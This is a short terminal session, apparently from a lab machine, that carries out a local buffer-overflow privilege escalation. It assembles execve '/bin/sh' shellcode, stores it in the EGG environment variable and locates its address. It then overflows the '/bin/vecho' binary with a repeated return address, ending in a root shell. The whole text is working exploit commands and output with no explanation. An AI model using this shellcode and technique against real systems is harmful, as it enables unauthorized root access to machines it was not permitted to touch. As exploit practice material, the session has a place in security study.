user@ubuntu-sts:~$ as --32 execve.asm -o execve.o
user@ubuntu-sts:~$ ld -Ttext 200000 --oformat binary -o shellcode.bin execve.o
user@ubuntu-sts:~$ objdump -b binary -m i386 -D shellcode.bin

shellcode.bin:     file format binary


Disassembly of section .data:

00000000 <.data>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	50                   	push   %eax
  10:	89 e1                	mov    %esp,%ecx
  12:	53                   	push   %ebx
  13:	89 c2                	mov    %eax,%edx
  15:	b0 0b                	mov    $0xb,%al
  17:	cd 80                	int    $0x80
user@ubuntu-sts:~$ export EGG=$(<shellcode.bin)
user@ubuntu-sts:~$ emacs getenvaddr.c
user@ubuntu-sts:~$ gcc -g -o getenvaddr getenvaddr.c
user@ubuntu-sts:~$ ./getenvaddr EGG /bin/vecho
EGG will be at 0xbffff94d
user@ubuntu-sts:~$ /bin/vecho $(python -c 'print "\x4d\xf9\xff\xbf" * 29')
# whoami
root
#